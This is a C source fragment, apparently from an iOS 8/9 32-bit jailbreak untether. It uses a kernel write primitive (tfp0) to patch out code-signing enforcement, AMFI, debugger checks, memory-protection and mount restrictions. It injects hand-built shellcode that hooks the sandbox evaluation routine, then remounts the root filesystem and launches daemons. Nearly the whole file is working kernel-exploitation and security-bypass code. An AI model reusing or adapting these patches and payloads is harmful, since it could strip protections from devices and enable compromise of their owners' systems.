    uint32_t mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
    uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
    uint32_t sb_patch = kbase + find_sb_patch(kbase, kdata, ksize);
    uint32_t memcmp_addr = find_memcmp(kbase, kdata, ksize);
    uint32_t vn_getpath = find_vn_getpath(kbase, kdata, ksize);
    uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
    uint32_t csops2_addr = kbase + find_csops2(kbase, kdata, ksize);
    
    printf("[PF] proc_enforce:               %08x\n", proc_enforce);
    printf("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
    printf("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
    printf("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
    printf("[PF] p_bootargs:                 %08x\n", p_bootargs);
    printf("[PF] vm_map_enter:               %08x\n", vm_map_enter);
    printf("[PF] vm_map_protect:             %08x\n", vm_map_protect);
    printf("[PF] mount_patch:                %08x\n", mount_patch);
    printf("[PF] mapForIO:                   %08x\n", mapForIO);
    printf("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
    printf("[PF] sb_evaluate:                %08x\n", sb_patch);
    printf("[PF] memcmp:                     %08x\n", memcmp_addr);
    printf("[PF] vn_getpath:                 %08x\n", vn_getpath);
    printf("[PF] csops:                      %08x\n", csops_addr);
    printf("[PF] csops2:                     %08x\n", csops2_addr);
    
    printf("[*] running kernelpatcher\n");
    
    /* proc_enforce: -> 0 */
    write_primitive_dword_tfp0(proc_enforce, 0);
    
    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
    write_primitive_byte_tfp0(cs_enforcement_disable_amfi, 1);
    write_primitive_byte_tfp0(cs_enforcement_disable_amfi-4, 1);
    
    /* debug_enabled -> 1 */
    write_primitive_dword_tfp0(PE_i_can_has_debugger_1, 1);
    write_primitive_dword_tfp0(PE_i_can_has_debugger_2, 1);
    
    /* bootArgs */
    patch_bootargs(p_bootargs);
    
    /* vm_map_enter */
    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_enter & ~0xFFF));
    write_primitive_dword_tfp0(vm_map_enter, 0x4280bf00);
    
    /* vm_map_protect: set NOP */
    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_protect & ~0xFFF));
    write_primitive_dword_tfp0(vm_map_protect, 0xbf00bf00);
    
    /* mount patch */
    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mount_patch & ~0xFFF));
    write_primitive_byte_tfp0(mount_patch, 0xe0);
    
    /* mapForIO: prevent kIOReturnLockedWrite error */
    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mapForIO & ~0xFFF));
    write_primitive_dword_tfp0(mapForIO, 0xbf00bf00);
    
    /* csops */
    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (csops_addr & ~0xFFF));
    write_primitive_dword_tfp0(csops_addr, 0xbf00bf00);
    
    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (csops2_addr & ~0xFFF));
    write_primitive_byte_tfp0(csops2_addr, 0x20);
    
    /* sandbox */
    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sandbox_call_i_can_has_debugger & ~0xFFF));
    write_primitive_dword_tfp0(sandbox_call_i_can_has_debugger, 0xbf00bf00);
    
    /* sb_evaluate */
    unsigned char taig32_payload[] = {
        0x1f, 0xb5, 0x06, 0x9b, 0xad, 0xf5, 0x82, 0x6d, 0x1c, 0x6b, 0x01, 0x2c,
        0x36, 0xd1, 0x5c, 0x6b, 0x00, 0x2c, 0x33, 0xd0, 0x69, 0x46, 0x5f, 0xf4,
        0x80, 0x60, 0x0d, 0xf5, 0x80, 0x62, 0x10, 0x60, 0x20, 0x46, 0x11, 0x11,
        0x11, 0x11, 0x1c, 0x28, 0x01, 0xd0, 0x00, 0x28, 0x26, 0xd1, 0x68, 0x46,
        0x17, 0xa1, 0x10, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x1f, 0xd0,
        0x68, 0x46, 0x0f, 0xf2, 0x61, 0x01, 0x13, 0x22, 0x22, 0x22, 0x22, 0x22,
        0x00, 0x28, 0x0f, 0xd1, 0x68, 0x46, 0x0f, 0xf2, 0x65, 0x01, 0x31, 0x22,
        0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x0f, 0xd0, 0x68, 0x46, 0x0f, 0xf2,
        0x87, 0x01, 0x27, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x07, 0xd1,
        0x0d, 0xf5, 0x82, 0x6d, 0x01, 0xbc, 0x00, 0x21, 0x01, 0x60, 0x18, 0x21,
        0x01, 0x71, 0x1e, 0xbd, 0x0d, 0xf5, 0x82, 0x6d, 0x05, 0x98, 0x86, 0x46,
        0x1f, 0xbc, 0x01, 0xb0, 0xcc, 0xcc, 0xcc, 0xcc, 0xdd, 0xdd, 0xdd, 0xdd,
        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
        0x2f, 0x74, 0x6d, 0x70, 0x00, 0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74,
        0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65,
        0x00, 0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61,
        0x72, 0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62,
        0x72, 0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65,
        0x6e, 0x63, 0x65, 0x73, 0x2f, 0x63, 0x6f, 0x6d, 0x2e, 0x61, 0x70, 0x70,
        0x6c, 0x65, 0x00, 0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f,
        0x76, 0x61, 0x72, 0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x2f, 0x4c,
        0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65,
        0x72, 0x65, 0x6e, 0x63, 0x65, 0x73, 0x00, 0x00
    };
    
    uint32_t payload_base = 0xb00; // taig8
    size_t payload_len = 272;
    
    uint32_t vn_getpath_bl = make_bl(payload_base+0x22, vn_getpath);
    uint32_t memcmp_bl_1 = make_bl(payload_base+0x34, memcmp_addr);
    uint32_t memcmp_bl_2 = make_bl(payload_base+0x44, memcmp_addr);
    uint32_t memcmp_bl_3 = make_bl(payload_base+0x54, memcmp_addr);
    uint32_t memcmp_bl_4 = make_bl(payload_base+0x64, memcmp_addr);
    uint32_t sb_evaluate_val = read_primitive_dword_tfp0(sb_patch);
    uint32_t back_sb_evaluate = make_b_w(payload_base+0x8c, (sb_patch+4-kbase));
    
    *(uint32_t*)(taig32_payload+0x22) = vn_getpath_bl;
    *(uint32_t*)(taig32_payload+0x34) = memcmp_bl_1;
    *(uint32_t*)(taig32_payload+0x44) = memcmp_bl_2;
    *(uint32_t*)(taig32_payload+0x54) = memcmp_bl_3;
    *(uint32_t*)(taig32_payload+0x64) = memcmp_bl_4;
    *(uint32_t*)(taig32_payload+0x88) = sb_evaluate_val;
    *(uint32_t*)(taig32_payload+0x8c) = back_sb_evaluate;
    
    void* sandbox_payload = malloc(payload_len);
    memcpy(sandbox_payload, taig32_payload, payload_len);
    
    // hook sb_evaluate
    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, ((kbase + payload_base) & ~0xFFF));
    copyout((kbase + payload_base), sandbox_payload, payload_len);
    
    uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sb_patch & ~0xFFF));
    write_primitive_dword_tfp0(sb_patch, sb_evaluate_hook);
    
    exec_primitive(flush_dcache, 0, 0);
    
    printf("enable patched.\n");
    
}


void load_jb(){
    
    // remount rootfs
    printf("[*] remounting rootfs\n");
    char* nmr = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
    printf("remount = %d\n",mntr);
    
    const char *jl;
    pid_t pd = 0;
    
    printf("[*] loading JB\n");
    // substrate: run "dirhelper"
    jl = "/bin/bash";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "/usr/libexec/dirhelper", NULL }, NULL);
    waitpid(pd, NULL, 0);
    
    jl = "/bin/launchctl";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/LaunchDaemons", NULL }, NULL);
    
#ifdef UNTETHER
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/NanoLaunchDaemons", NULL }, NULL);
    
    jl = "/usr/libexec/CrashHousekeeping_o";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, NULL }, NULL);
#endif
    
#ifdef RELOADER
    jl = "/usr/bin/killall";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "-9", "backboardd", NULL }, NULL);
#endif
    
}

void failed(void){
    
    printf("[-] failed to execute untether. rebooting.\n");
    reboot(0);
}

int main(void){
    
    init();
    
    offsets_init();
    initialize();
    
    uint32_t kernel_base = leak_kernel_base();
    printf("[*] kernel_base: %x\n", kernel_base);
    
    do_exploit(kernel_base);
    
    if(tfp0){
        printf("[*] got tfp0: %x\n", tfp0);
        
        if(!isIOS9){
            unjail8(kernel_base);
        } else {
            //unjail9(kernel_base); // TODO
        }
        load_jb();
        
    } else {
        printf("[-] Failed to get tfp0\n");
        failed();
        return -1;
    }
    
    printf("[*] DONE!\n");
    
    return 0;
}
